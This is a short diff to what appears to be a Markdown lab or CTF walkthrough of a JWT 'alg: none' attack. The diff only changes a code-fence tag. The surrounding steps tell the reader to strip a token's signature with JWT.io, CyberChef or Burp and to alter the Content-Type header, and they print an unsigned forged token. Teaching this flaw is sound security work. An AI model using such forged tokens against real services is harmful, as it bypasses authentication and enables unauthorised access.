@@ -41,7 +41,7 @@ Accept-Language: pt-BR,pt;q=0.9
 Upgrade-Insecure-Requests: 1
  ```
  * Get the JWT token and remove the signature for our `alg: none` attack. You can use JWT.io, CyberChef or JWT Editor on Burp.
- ```json
+ ```
  eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyX2lkIjoxMywidXNlcm5hbWUiOiJxdWludGEiLCJyb2xlIjoidXNlciIsImV4cCI6MTc2MzkxNTYyNH0.
  ```
  * Change the `Content-Type` Header to `application/x-www-form-urlencoded`.
